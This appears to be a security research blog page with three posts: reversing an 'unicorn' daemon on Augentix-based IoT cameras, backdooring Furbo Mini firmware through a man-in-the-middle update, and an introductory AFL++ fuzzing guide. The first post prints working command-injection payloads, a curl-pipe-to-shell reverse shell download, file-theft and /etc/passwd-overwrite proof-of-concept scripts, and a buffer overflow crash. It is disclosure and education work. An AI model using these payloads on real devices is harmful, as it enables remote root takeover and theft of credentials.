                    if (ptr_result == (char *)0x0) {
                      syslog(6,"Invalid command \'%s\' received! Closing client fd %d\n",0,__fd_00);
                      goto LAB_0000e02c;
                    }
                    if ((DATA_FROM_CLIENT_PLUS1[command_length] != '@') ||
                       (client_command_buffer = (byte *)(ptr_result + 0x12),
                       client_command_buffer == (byte *)0x0)) goto LAB_0000e02c;
                    if (IS_SSL_ENABLED != 1) {
                      syslog(6,"Handle action for client %2d, fdmax = %d ...\n",__fd_00,uVar12);
                      command_length =
                           handle_client_cmd(client_command_buffer,client_info,command_length);
                      if (command_length != 0) {
                        send_response_to_client
                                  ((int)*client_info,apSStack_8520 + uVar9 * 5 + 2,command_length);
                      }
                      goto LAB_0000e02c;
                    }
```

The **AgtxCrossPlatCommn** portion of the code checks whether or not the data received ends with an **@** character or if the data following **AgtxCrossPlatCommn** string is NULL. If the data doesn’t end with an **@** character or the data following the key string is NULL it branches off. If these checks pass, the data is then sent to another function which handles the processing of the commands from the client. At this point we know that the binary expects to receive data in the format AgtxCrossPlatCommn<DATA>@. The **handle\_client\_cmd** function is where the fun happens. The beginning of the function handles some additional processing of the data received.

```
  if (client_command_buffer == (byte *)0x0) {
    syslog(6,"Invalid action: sig is NULL \n");
    return -3;
  }
  ACTION_NUM = get_Action_NUM(client_command_buffer);
  client_command = get_cmd_data(client_command_buffer,command_length);
  operation_result = ACTION_NUM;
  iVar1 = command_length;
  ptr_to_cmd = client_command;
  syslog(6,"%s(): action %d, nbytes %d, params %s\n","handleAction",ACTION_NUM,command_length,
         client_command);
  memset(system_command_buffer,0,0x100);
  switch(ACTION_NUM) {
  case 0:
```

The binary is expecting the data received to contain a number, which is parsed out and passed to a switch() statement to determine which action needs to be executed. There are a total of 15 actions which perform various tasks such as read files, write files, execute arbitrary commands (some intentional, others not), along with others whose purpose wasn’t not inherently clear. The first action number which caught our eye was 14 (0xe) as it appeared to directly allow us to run commands.

```
  case 0xe:
/* execute commands here
AgtxCrossPlatCommn14 sh -c 'curl 192.168.55.1/shell.sh | sh'@ */

    replaceLastByteWithNull((byte *)client_command,0x40,command_length);
    syslog(6,"ACT_cmd: |%s| \n",client_command);
    command_params = strstr(client_command,"rm ");
    if (command_params == (char *)0x0) {
      command_params = strstr(client_command,"audioctrl");
      if (((((((command_params != (char *)0x0) ||
              (command_params = strstr(client_command,"light_test"), command_params != (char *)0x0))
             || (command_params = strstr(client_command,"ir_cut.sh"), command_params != (char *)0x0)
             ) || ((command_params = strstr(client_command,"led.sh"), command_params != (char *)0x0
                   || (command_params = strstr(client_command,"sh"), command_params != (char *)0x0))
                  )) ||
           ((command_params = strstr(client_command,"touch"), command_params != (char *)0x0 ||
            ((command_params = strstr(client_command,"echo"), command_params != (char *)0x0 ||
             (command_params = strstr(client_command,"find"), command_params != (char *)0x0)))))) ||
          (command_params = strstr(client_command,"iwconfig"), command_params != (char *)0x0)) ||
         (((((command_params = strstr(client_command,"ifconfig"), command_params != (char *)0x0 ||
             (command_params = strstr(client_command,"killall"), command_params != (char *)0x0)) ||
            (command_params = strstr(client_command,"reboot"), command_params != (char *)0x0)) ||
           (((command_params = strstr(client_command,"mode"), command_params != (char *)0x0 ||
             (command_params = strstr(client_command,"gpio_utils"), command_params != (char *)0x0))
            || ((command_params = strstr(client_command,"bp_utils"), command_params != (char *)0x0
                || ((command_params = strstr(client_command,"sync"), command_params != (char *)0x0
                    || (command_params = strstr(client_command,"chmod"),
                       command_params != (char *)0x0)))))))) ||
          ((command_params = strstr(client_command,"dos2unix"), command_params != (char *)0x0 ||
           (command_params = strstr(client_command,"mkdir"), command_params != (char *)0x0)))))) {
        syslog(6,"Command code: %d\n");
        system_command_status = run_system_cmd(client_command);
        goto LAB_0000b458;
      }
      system_command_result = -1;
    }
    else {
      system_command_result = -2;
    }
    syslog(3,"Invaild command code: %d\n",system_command_result);
    system_command_status = -1;
LAB_0000b458:
    send_response_to_client((int)*client_info,(SSL **)(client_info + 4),system_command_status);
    break;
```

To test, we manually started the unicorn binary and attempted to issue an ifconfig command with the payload **AgtxCrossPlatCommn14ifconfig@** and the following python script:

```
import socket

HOST = "192.168.55.128"
PORT = 6666

with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
    s.connect((HOST, PORT))
    s.sendall(b"AgtxCrossPlatCommn14ifconfig@")
    data = s.recv(1024)
    print("RX:", data.decode('utf-8'))
    s.close()
```

No data was written back to the socket, but on emulated device we saw that the command was executed:

```
/system/bin # ./unicorn
eth0      Link encap:Ethernet  HWaddr 52:54:00:12:34:56
          inet addr:192.168.100.2  Bcast:192.168.100.255  Mask:255.255.255.0
          UP BROADCAST RUNNING MULTICAST  MTU:1500  Metric:1
          RX packets:5849 errors:0 dropped:0 overruns:0 frame:0
          TX packets:4680 errors:0 dropped:0 overruns:0 carrier:0
          collisions:0 txqueuelen:1000
          RX bytes:6133675 (5.8 MiB)  TX bytes:482775 (471.4 KiB)
          Interrupt:47

lo        Link encap:Local Loopback
          inet addr:127.0.0.1  Mask:255.0.0.0
          UP LOOPBACK RUNNING  MTU:65536  Metric:1
          RX packets:0 errors:0 dropped:0 overruns:0 frame:0
          TX packets:0 errors:0 dropped:0 overruns:0 carrier:0
          collisions:0 txqueuelen:0
          RX bytes:0 (0.0 B)  TX bytes:0 (0.0 B)
```

Note that the difference in the IP is due to the device being emulated utilizing EMUX (<https://emux.exploitlab.net/>). One of the commands that is “allowed” per this case is **sh**, which means we can actually run any command on the system and not just ones listed. For example, the following payload could be used to download and execute a reverse shell on the device:

```
AgtxCrossPlatCommn14 sh -c 'curl 192.168.55.1/shell.sh | sh'@
```

Even if this case didn’t allow for the execution of **sh**, commands could still be chained together and executed with a payload like **AgtxCrossPlatCommn14echo hello;id;ls -l@**.

```
/system/bin # ./unicorn
hello
uid=0(root) gid=0(root) groups=0(root),10(wheel)
-rwxr-xr-x    1 dbus     dbus          3774 Apr  9 20:33 actl
-rwxr-xr-x    1 dbus     dbus          2458 Apr  9 20:33 adc_read
-rwxr-xr-x    1 dbus     dbus       1868721 Apr  9 20:33 av_main
-rwxr-xr-x    1 dbus     dbus          5930 Apr  9 20:33 burn_in
-rwxr-xr-x    1 dbus     dbus        451901 Apr  9 20:33 cmdsender
-rwxr-xr-x    1 dbus     dbus         13166 Apr  9 20:33 cpu
-rwxr-xr-x    1 dbus     dbus        162993 Apr  9 20:33 csr
-rwxr-xr-x    1 dbus     dbus          9006 Apr  9 20:33 dbmonitor
-rwxr-xr-x    1 dbus     dbus         13065 Apr  9 20:33 ddr2pgm
-rwxr-xr-x    1 dbus     dbus          2530 Apr  9 20:33 dump
-rwxr-xr-x    1 dbus     dbus          4909 Apr  9 20:33 dump_csr
...SNIP...
```

We performed analysis of other areas of the unicorn executable and identified additional command injection and buffer overflow vulnerabilities. Case 2 is used to execute the **cmdsender** binary on the device, which appears to be a utility to control certain camera related aspects of the device.

```
  case 2:
    replaceLastByteWithNull((byte *)client_command,0x40,command_length);
    path_buffer[0] = '/';
    path_buffer[1] = 's';
    path_buffer[2] = 'y';
    path_buffer[3] = 's';
    path_buffer[4] = 't';
    path_buffer[5] = 'e';
    path_buffer[6] = 'm';
    path_buffer[7] = '/';
    path_buffer[8] = 'b';
    path_buffer[9] = 'i';
    path_buffer[10] = 'n';
    path_buffer[11] = '/';
    path_buffer[12] = 'c';
    path_buffer[13] = 'm';
    path_buffer[14] = 'd';
    path_buffer[15] = 's';
    path_buffer[16] = 'e';
    path_buffer[17] = 'n';
    path_buffer[18] = 'd';
    path_buffer[19] = 'e';
    path_buffer[20] = 'r';
    path_buffer[21] = ' ';
    path_buffer[22] = '\0';
    memset(large_buffer,0,0x7fe9);
    strcpy(path_buffer + 0x16,client_command);
    run_system_cmd(path_buffer);
    break;
```

Running the cmdsender binary on the device:

```
/system/bin # ./cmdsender -h
[VPLAT] VB init fail.                                                                                                                                                                                    [VPLAT] UTRC init fail.                                                                                                                                                                                  [VPLAT] SR open shared memory fail.                                                                                                                                                                      [VPLAT] SENIF init fail.
[VPLAT] IS init fail.
[VPLAT] ISP init fail.
[VPLAT] ENC init fail.
[VPLAT] OSD init fail.
USAGE:
        ./cmdsender [Option] [Parameter]

OPTION:
        '--roi dev_idx path_idx luma_roi.sx luma_roi.sy luma_roi.ex luma_roi.ey awb_roi.sx awb_roi.sy awb_roi.ex awb_roi.ey' Set ROI attributes
        '--pta dev_idx path_idx mode brightness_value contrast_value break_point_value pta_auto.tone[0 ~ MPI_ISO_LUT_ENTRY_NUM-1] pta_manual.curve[0 ~ MPI_PTA_CURVE_ENTRY_NUM-1]' Set PTA attributes

        '--dcc dev_idx path_idx gain0 offset0 gain1 offset1 gain2 offset2 gain3 offset3' Set DCC attributes

        '--dip dev_idx path_idx is_dip_en is_ae_en is_iso_en is_awb_en is_csm_en is_te_en is_pta_en is_nr_en is_shp_en is_gamma_en is_dpc_en is_dms_en is_me_en' Set DIP attributes

        '--lsc dev_idx path_idx origin x_trend_2s y_trend_2s x_curvature y_curvature tilt_2s' Set LSC attributes
                                                                                                                                                                                                                 '--gamma dev_idx path_idx mode' Set GAMMA attributes

        '--ae dev_idx path_idx sys_gain_range.min sys_gain_range.max sensor_gain_range.min sensor_gain_range.max isp_gain_range.min isp_gain_range.max frame_rate slow_frame_rate speed black_speed_bias
interval brightness tolerance gain_thr_up gain_thr_down
              strategy.mode strategy.strength roi.luma_weight roi.awb_weight delay.black_delay_frame delay.white_delay_frame anti_flicker.enable anti_flicker.frequency anti_flicker.luma_delta fps_mode
manual.is_valid manual.enable.bit.exp_value manual.enable.bit.inttime
              manual.enable.bit.sensor_gain manual.enable.bit.isp_gain manual.enable.bit.sys_gain manual.exp_value manual.inttime manual.sensor_gain manual.isp_gain manual.sys_gain' Set AE attributes

        '--iso dev_idx path_idx mode iso_auto.effective_iso[0 ~ MPI_ISO_LUT_ENTRY_NUM-1] iso_manual.effective_iso' Set iso attributes

        '--dbc dev_idx path_idx mode dbc_level' Set DBC attributes
```

The arguments that are intended to be used with the cmdsender command are received and copied directly to the cmdsender path, which is then passed **run\_system\_cmd**, which simply runs **system()** on the given argument. The payload **AgtxCrossPlatCommn2 ; id @** causes the **id** command to be run on the device:

```
/system/bin # ./unicorn
[VPLAT] VB init fail.
[VPLAT] UTRC init fail.
[VPLAT] SR open shared memory fail.
[VPLAT] SENIF init fail.
[VPLAT] IS init fail.
[VPLAT] ISP init fail.
[VPLAT] ENC init fail.
[VPLAT] OSD init fail.
executeCmd(): Unknown command item
item: 920495836, direction: 1
printCmd(): Unknown command item
uid=0(root) gid=0(root) groups=0(root),10(wheel)
```

Case 4 handles sending files from the device to the connecting client, for example to get /etc/shadow from the device, the payload **AgtxCrossPlatCommn4/etc/shadow@** can be used.

```
python3 case_4.py
b'root:$1$3hkdVSSD$iPawbqSvi5uhb7JIjY.MK0:10933:0:99999:7:::\ndaemon:*:10933:0:99999:7:::\nbin:*:10933:0:99999:7:::\nsys:*:10933:0:99999:7:::\nsync:*:10933:0:99999:7:::\nmail:*:10933:0:99999:7:::\nwww-data:*:10933:0:99999:7:::\noperator:*:10933:0:99999:7:::\nnobody:*:10933:0:99999:7:::\ndbus:*:::::::\nsshd:*:::::::\nsystemd-bus-proxy:*:::::::\nsystemd-journal-gateway:*:::::::\nsystemd-journal-remote:*:::::::\nsystemd-journal-upload:*:::::::\nsystemd-timesync:*:::::::\n'
```

Case 5 appears to be for receiving files from a client and is also vulnerable to command injection. Although in this instance spaces break execution, which limits what can be run.

```
  case 5:
    replaceLastByteWithNull((byte *)client_command,0x40,command_length);
    file_size = parse_file_size((byte *)client_command);
    string_length = strlen(client_command);
    filename = get_cmd_data((byte *)client_command,string_length);
    syslog(6,"fSize = %lu\n",file_size);
    syslog(6,"fPath = \'%s\'\n",filename);
    sprintf(system_command_buffer,"%lu",file_size);
    syslog(6,"ret_value: %s\n",system_command_buffer);
    string_length = strlen(system_command_buffer);
    send_data_to_client((int *)client_info,system_command_buffer,string_length);
    operation_result = recieve_file((int)*client_info,(char *)filename,file_size);
    send_response_to_client((int)*client_info,(SSL **)(client_info + 4),operation_result);
    break;
```

The format of this command is:

```
AgtxCrossPlatCommn5<FILE> <NUM-BYTES>@
```

**<FILE>** is the name of the file to write and **<NUM-BYTES>** is the number of bytes that will be sent in the subsequent client transmit. The parse\_file\_size() function looks for the space and attempts to read the following characters as the number of bytes that will be sent. A command with no spaces, such as the id command, can be injected into the **<FILE>** portion:

```
AgtxCrossPlatCommn5test.txt;id #@

# Output from device
/system/bin # ./unicorn
dos2unix: can't open 'test.txt': No such file or directory
uid=0(root) gid=0(root) groups=0(root),10(wheel)
^C

/system/bin # ls -l test.*
----------    1 root     root             0 Apr 18  2024 test.txt;id
```

This case can also be used to overwrite files. The follow POC changes the first line in /etc/passwd:

```
import socket

HOST = "192.168.55.128"
PORT = 6666

with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
    s.connect((HOST, PORT))
    s.sendall(b"AgtxCrossPlatCommn5/etc/passwd 29@")
    print(s.recv(1024))
    s.sendall(b"haxd:x:0:0:root:/root:/bin/sh")
    print(s.recv(1024))
    s.close()
```

```
/system/bin # cat /etc/passwd
haxd:x:0:0:root:/root:/bin/sh
daemon:x:1:1:daemon:/usr/sbin:/bin/false
bin:x:2:2:bin:/bin:/bin/false
sys:x:3:3:sys:/dev:/bin/false
sync:x:4:100:sync:/bin:/bin/sync
mail:x:8:8:mail:/var/spool/mail:/bin/false
www-data:x:33:33:www-data:/var/www:/bin/false
operator:x:37:37:Operator:/var:/bin/false
nobody:x:99:99:nobody:/home:/bin/false
dbus:x:1000:1000:DBus messagebus user:/var/run/dbus:/bin/false
sshd:x:1001:1001:SSH drop priv user:/:/bin/false
systemd-bus-proxy:x:1002:1004:Proxy D-Bus messages to/from a bus:/:/bin/false
systemd-journal-gateway:x:1003:1005:Journal Gateway:/var/log/journal:/bin/false
systemd-journal-remote:x:1004:1006:Journal Remote:/var/log/journal/remote:/bin/false
systemd-journal-upload:x:1005:1007:Journal Upload:/:/bin/false
systemd-timesync:x:1006:1008:Network Time Synchronization:/:/bin/false
```

Case 8 contains a command injection vulnerability. It is used to run the fw\_setenv command, but takes user input as an argument and builds the command string which gets passed directly to a system() call.

```
  case 8:
  /* command injection here
    AgtxCrossPlatCommn8 ; touch /tmp/fw-setenv-cmdinj.txt # @ */

    replaceLastByteWithNull((byte *)client_command,0x40,command_length);
    if (*client_command == '\0') {
      command_params = "fw_setenv --script /system/partition";
    }
    else {
      operation_result = FUN_0000ccd8(client_command);
      if (operation_result != 1) {
        operation_result = FUN_0000da18((int *)client_info,client_command);
        if (operation_result != -1) {
          return 0;
        }
        operation_result = -1;
        goto LAB_0000b63c;
      }
      sprintf(system_command_buffer,"fw_setenv %s",client_command);
      command_params = system_command_buffer;
    }
    system_command_status = run_system_cmd(command_params);
    goto LAB_0000b458;
```

The payload **AgtxCrossPlatCommn8;id @**  will cause the id command to be executed.

Case 13 contains a buffer overflow vulnerability. The use case case runs cat on a user provided file. If the filename or path is too long, it causes a buffer overflow.

```
  case 0xd:
    replaceLastByteWithNull((byte *)client_command,0x40,command_length);
    syslog(6,"ACT_cat: |%s| \n",client_command);
    operation_result = execute_cat_cmd((int *)client_info,client_command);
    if (operation_result != -1) {
      return 0;
    }
LAB_0000b63c:
    sprintf(system_command_buffer,"%d",operation_result);
    string_length = strlen(system_command_buffer);
    send_data_to_client((int *)client_info,system_command_buffer,string_length);
    break;
```
```
int execute_cat_cmd(int *socket_info,char *file_path)

{
  size_t result_length;
  char cat_command [128];
  char cat_result [256];

  memset(cat_result,0,0x100);
  memset(cat_command,0,0x80);
                    /* Buffer overflow here when file_path > 128
                        */
  sprintf(cat_command,"cat %s",file_path);
  FUN_0000cdc4(cat_command,cat_result);
  result_length = strlen(cat_result);
  send_data_to_client(socket_info,cat_result,result_length);
  return 0;
}
```

Sending a large amount of A’s causes a segfault showing several registers, including the program counter, and the stack are overwritten with A’s. The payload **AgtxCrossPlatCommn13 AAAAAAAAAAAAAA…snipped… @** will cause a crash.

```
Program received signal SIGSEGV, Segmentation fault.
0x41414140 in ?? ()
────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── registers ────
$r0  : 0x0
$r1  : 0x7efe7188  →  0x4100312d ("-1"?)
$r2  : 0x2
$r3  : 0x0
$r4  : 0x41414141 ("AAAA"?)
$r5  : 0x41414141 ("AAAA"?)
$r6  : 0x13a0
$r7  : 0x7efef628  →  0x00000005
$r8  : 0x7efefaea  →  "   AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA[...]"
$r9  : 0x0008d40c  →  0x00000000
$r10 : 0x13a0
$r11 : 0x41414141 ("AAAA"?)
$r12 : 0x0
$sp  : 0x7efe7298  →  "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA[...]"
$lr  : 0x00012de4  →  0xe1a04000
$pc  : 0x41414140 ("@AAA"?)
$cpsr: [negative ZERO CARRY overflow interrupt fast THUMB]
────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── stack ────
0x7efe7298│+0x0000: "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA[...]"    ← $sp
0x7efe729c│+0x0004: "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA[...]"
0x7efe72a0│+0x0008: "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA[...]"
0x7efe72a4│+0x000c: "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA[...]"
0x7efe72a8│+0x0010: "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA[...]"
0x7efe72ac│+0x0014: "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA[...]"
0x7efe72b0│+0x0018: "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA[...]"
0x7efe72b4│+0x001c: "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA[...]"
───────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── code:arm:THUMB ────
[!] Cannot disassemble from $PC
[!] Cannot access memory at address 0x41414140
──────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── threads ────
[#0] Id 1, Name: "unicorn", stopped 0x41414140 in ?? (), reason: SIGSEGV
──────────────────────────────────────────────────────────────────────────────────────
```

The research shows that a misconfiguration in firmware can lead to multiple code execution paths and reducing the remote attack surfaces, especially from developer tools, can greatly reduce the risk to an IoT device. We recommend that manufactures of devices verify that the unicorn binary is not running or enabled as a service. This would mitigate all of the code execution paths described above. If you have any devices utilizing Augentix SoCs that have this binary, we’d love to hear about it.

Posted on June 14, 2024 by [Jared French](/blog?author=6077763e2794bb679d0a5ee9).

[Comment](/blog/2024/6/5/reversing-the-unicorn#comments-6660d91d4deb18215186a123)

# [Hacking the Furbo Dog Camera: Part III Fun with Firmware](/blog/2022/hacking-the-furbo-dog-camera-part-iii)

We’re back with another entry in our Furbo hacking escapade! In our last post we mentioned we were taking a look at the then recently released Furbo Mini device and we are finally getting around to writing about what we found.

## Background

Some time in the fall of 2021 we got a notification that Furbo was releasing a new product called the Furbo Mini. Having not gotten much of a response from Furbo regarding our previously discovered vulnerabilities, we were curious to see if either of them could be used to exploit the Mini.

Upon receiving a couple of devices, we setup and configured one and ran a port scan to see what we had to work with. Unlike the other devices, our port scan found no listening services on the device, greatly eliminating a remote attack service. However, we weren’t ready to admit defeat just yet.

## Vulnerability Hunting

We tore down the Mini device and found that they had moved from an Ambarella SoC found in version 2 and 2.5T to an Augentix SoC.

![](https://images.squarespace-cdn.com/content/v1/543effd8e4b095fba39dfe59/95af2f6b-c171-4939-9e96-065639349a08/image2.png)

After probing some of the test points on the main PCB, we found UART enabled similarly to the previous devices. After utilizing an FTDI and attaching to the UART pins, we were presented with a login prompt which we did not have the credentials for. When rebooting the device the bootlogs indicated that the device was using uboot (instead of amboot on the Ambarella based devices). Pressing any key during the boot process allowed us to interrupt and enter a uboot shell. We modified the uboot boot parameters to change the init value to be /bin/sh, which dropped us into a root shell upon booting.

![](https://images.squarespace-cdn.com/content/v1/543effd8e4b095fba39dfe59/205b39b0-47c1-412c-9a2d-c62d71937563/image6.png)

After obtaining a root shell on the Furbo Mini device via UART, we noticed that the filesystem was read-only. The bootlogs showed that the device used a SquashFS for its root filesystem, which is read-only. This means we can’t simply add a new user to the device from our UART shell. When modifying the init parameters to be init=/bin/sh the Furbo was not functioning fully as all the Furbo libraries and features were not started. Ultimately we wanted root access on a fully initialized device so we began to investigate the firmware update process.

The device downloads firmware from a publicly accessible S3 bucket with listing enabled allowing us to view everything hosted in the bucket. Upon initial reverse engineering of the firmware update process it did not appear that the Furbo Mini was doing digital signature checking of the firmware. Additionally, by monitoring UART we could see the curl command used to download the firmware from the S3 bucket. The command used the -k option which skips certificate verification and allows for insecure TLS connections. We wrote a custom python HTTPS server, created a self-signed certificate, configured our local router with a DNS entry to resolve the S3 bucket address to one of our laptops, and supplied the firmware image to the device we wanted to update. This allowed us to verify that we could indeed get the device to download firmware from a host we control, and allowed us to work out exact expected responses.

The device has two different slots it can boot from. After the update, the device was booting from Slot B. From uboot, we switched the device back to Slot A to get it to boot with the out of date firmware version, allowing us to retest the update process. The next step was to modify the firmware to allow remote access after the update.

## Exploitation

To exploit the Furbo Mini we needed to extract the firmware files and repackage the firmware with a backdoor installed to achieve remote code execution (RCE). The firmware file was an SWU file that could be downloaded directly from the S3 bucket. The firmware file contained a few layers. The first was extracted using the cpio command.

![](https://images.squarespace-cdn.com/content/v1/543effd8e4b095fba39dfe59/bfa1c2a8-6646-42b0-bf05-c8828d6c6ab3/image14.png)

The rootfs.cpio.uboot.bin file was a UBI image. We used the ubireader tools ([https://github.com/jrspruitt/ubi\_reader)](https://github.com/jrspruitt/ubi_reader%29) to extract the contents.

![](https://images.squarespace-cdn.com/content/v1/543effd8e4b095fba39dfe59/e987a2c7-933c-4ec8-8651-7ce017e11143/image7.png)

This left us with the SqaushFS file, which was extracted with the unsquashfs command.

![](https://images.squarespace-cdn.com/content/v1/543effd8e4b095fba39dfe59/ecaa6ce2-e75f-4ae1-8bd7-3264ed5f3277/image5.png)

As with any good challenge, we are greeted with a file named "THIS\_IS\_NOT\_YOUR\_ROOT\_FILESYSTEM". Challenge accepted! We decided to modify the firmware and add a new user ("user") by changing the /etc/shadow and /etc/passwd files. The "user:x:0:0:root:/root:/bin/sh" string was added to /etc/passwd and "user:$1$TRFAGWPb$xwzaBH19Er5xEdJatZVwO0:10933:0:99999:7:::" was added to /etc/shadow.

Additional analysis of the firmware showed us that the device could be put into developer mode which enables telnet and another custom binary called unicorn. The unicorn binary itself was very interesting and will be the subject of another blog post. For our purposes we wanted telnet for an easy remote connection after the update. We modified an init script to start telnetd and then repackaged the firmware.

The SquashFS file was rebuilt with the mksquashfs command.

![](https://images.squarespace-cdn.com/content/v1/543effd8e4b095fba39dfe59/9eb1a4e9-5832-4c05-93cc-551faa65440d/image1.png)

The next trick was padding the firmware file to match the size of the prior firmware file. Notice that the files have a different size below.

![](https://images.squarespace-cdn.com/content/v1/543effd8e4b095fba39dfe59/6d3c1662-0b2f-4062-9951-6aa020e16e83/image11.png)

We wrote a small python script to pad the new SquashFS with the correct amount of data.

![](https://images.squarespace-cdn.com/content/v1/543effd8e4b095fba39dfe59/6711b910-7804-4cd6-8a4c-24c4ebfbc33a/image15.png)

Next we re-wrapped the squashfs onto a UBI block with the ubinize tool. To get this step correct we needed to check the GD5F2GQ5xExxH NAND flash datasheet ([https://www.gigadevice.com/datasheet/gd5f2gq5xexxh/](https://www.google.com/url?sa=i&rct=j&q=&esrc=s&source=web&cd=&ved=0CAQQw7AJahcKEwjAsOb8utT7AhUAAAAAHQAAAAAQAg&url=https%3A%2F%2Fwww.gigadevice.com%2Fdatasheet%2Fgd5f2gq5xexxh%2F&psig=AOvVaw31Hy-7MEx7KarjoS82vLLj&ust=1669847968129446)) to find the block size (128KiB) and page size (2048 bytes).

![](https://images.squarespace-cdn.com/content/v1/543effd8e4b095fba39dfe59/5688d311-3017-469c-ad55-dea8e6edf8d9/image9.png)

The last step was to repackage the SWU file with our modified rootfs in the correct order. We used a small bash script to accomplish this.

![](https://images.squarespace-cdn.com/content/v1/543effd8e4b095fba39dfe59/4c0581dc-1bae-4d78-981b-dd9d6b8f123f/image13.png)

With the modified file matching the format of the original, we spun up our python server running with our self-signed certificate, and attempted another firmware update. After waiting for the update process to complete, we attempted to login to the device via telnet using the credentials we added and it worked!

![](https://images.squarespace-cdn.com/content/v1/543effd8e4b095fba39dfe59/74d7ccd8-14d2-41b4-ad6d-48132325ce1f/image10.png)

The result demonstrates that any Furbo Mini can be compromised with an active man-in-the-middle attack and a specially crafted firmware file. This could result in an attacker viewing the camera feed, listening to audio, stealing WiFi credentials, transmitting malicious audio or tossing treats.

## Disclosure and Timeline

Similar to our last Furbo 2.5T vulnerabilities, we have disclosed the Furbo Mini vulnerabilities to Furbo but the devices still remain vulnerable and unpatched.

| **Event** | **Date** |
| --- | --- |
| Purchased Furbo Mini | 10/2/2021 |
| Successfully backdoored firmware | 10/7/2021 |
| Attempted to contact furbo to disclose issues | 10/8/2021 |
|

Posted on December 8, 2022 by [Jared French](/blog?author=6077763e2794bb679d0a5ee9) and tagged [Firmware Exploitation](/blog?tag=Firmware+Exploitation) [Furbo Update MiTM](/blog?tag=Furbo+Update+MiTM).

# [Fuzzing for CVEs Part I (Local Targets)](/blog/fuzzing-for-cves-part-i-local-targets)

## **Overview**

In the context of cybersecurity, zero-day vulnerabilities are defined as undisclosed weaknesses in software, hardware, or firmware that can be utilized by malicious attackers to take advantage of a system [[1]](https://en.wikipedia.org/wiki/Zero-day_%28computing%29). Finding zero-day vulnerabilities can be the most fulfilling and frustrating task presented to security personnel and developers across all industries.  The race to find zero-day vulnerabilities is crucial to the success of an organization in preventing data breaches and cybercrime.

Fuzzing is the process of identifying bugs and vulnerabilities by sending unexpected and malformed input to the target.  For example, if a developer created a tool that transformed all uppercase characters in a body of text to lowercase characters, the fuzzing process would include sending numbers or special characters to the developer’s tool in an attempt to crash the program.  The numbers and characters in this scenario represent unexpected data provided to the program that the developer may not have anticipated.

The fuzzing process described in the following sections was used to discover [CVE-2022-41220](https://www.cve.org/CVERecord?id=CVE-2022-41220), [CVE-2022-36752](https://www.cve.org/CVERecord?id=CVE-2022-36752), [CVE-2022-34913](https://www.cve.org/CVERecord?id=CVE-2022-34913), and [CVE-2022-34556](https://www.cve.org/CVERecord?id=CVE-2022-34556). This process is repeatable at a large scale and can be employed by software developers and security researchers to quickly discover hidden flaws in a system.

![](https://images.squarespace-cdn.com/content/v1/543effd8e4b095fba39dfe59/6c6a56a9-2293-4539-96f9-544ba003e1c6/Screen+Shot+2022-10-13+at+1.41.19+PM.png)

## **Prerequisites**

* Basic C Programming and Compilation
* Basic Linux Command Line Tools
* Basic Understanding of Buffer Overflows
* Basic Understanding of the Stack and Heap

## **Disclosure and Disclaimer**

The vulnerabilities discussed in this post were disclosed to the respective security teams. This post was intended for developers and security researchers who are interested in identifying vulnerabilities within applications and is for **educational purposes only**.

## **Fuzzing Process Overview**

The process of fuzzing local programs varies from fuzzing remote programs. A local program is defined as a program that does not receive input over a network connection, and a remote program is a program that receives input from a network connection.  An example of a local program would be the Linux ‘ls’ command, and a remote program would be the ‘apache2’ http server.

When we are fuzzing local programs we can quickly provide input to the program via stdin and send a large amount of test cases without being concerned about packet loss, rate limiting, and other remote connectivity issues.  When using a local program, there can be various entry points into the program where a user can provide necessary information to carry out a particular task.

Let’s take a look at a vulnerable C program that takes input from the command line.

```

#include &ltstdio.h>

int main( int argc, char *argv[] )  {

   char buf[40];
   if (argc == 1){
     printf("Program name %s\n", argv[0]);
   }
   else if( argc == 2 ) {
      printf("The second argument given to the program is %s\n", argv[1]);
   }
   else if( argc > 2 && argc < 4){
      strcpy(buf, argv[2]);
   }
   else {
      printf("One argument expected.\n");
   }
}

```
![](https://images.squarespace-cdn.com/content/v1/543effd8e4b095fba39dfe59/19a78326-cd02-41f4-8faf-419240c41ee0/my_c.png)

Looking at our rudimentary C program we can verify that we have 1 program, four entry points (or ‘targets’), and an infinite amount of data (or ‘test cases’) we can provide to each target. As bug hunters, we need a repeatable methodology for discovering flaws in our software that resembles the following process:

1. **Target identification**- Identify all entry points into the program.
2. **Fuzzing**- Send test cases to each target in an attempt to crash the program.
3. **Triage**- Run each test case that successfully crashed the program and determine if it is a security vulnerability.

Given the endless array of possible test cases we could provide each target, it would be nice to automate the fuzzing process with a tool that can generate a large number of test cases for each target and subsequently modify each test case depending on how the program reacts to a particular subset of data.  A popular open source tool that was created for this very scenario is called AFL++.

## **AFL++**

At its core, AFL++ is a fuzzer that generates input based on an initial test case given to it by a user. The generated input is subsequently fed into a target software program. As AFL++ learns more about the program, it mutates the input to better identify bugs with the goal of crashing the program by making it exhibit unexpected behavior. We highly recommend checking out their [Github](https://github.com/AFLplusplus/AFLplusplus/blob/stable/docs/README.md) for more details on how this works. The entire process from compilation of a target using instrumentation to inciting a crash can be seen below:

![](https://images.squarespace-cdn.com/content/v1/543effd8e4b095fba39dfe59/12b7d422-b1c4-4cd6-9853-c280150018d3/Screen-Shot-2022-06-30-at-4.37.18-PM.png)

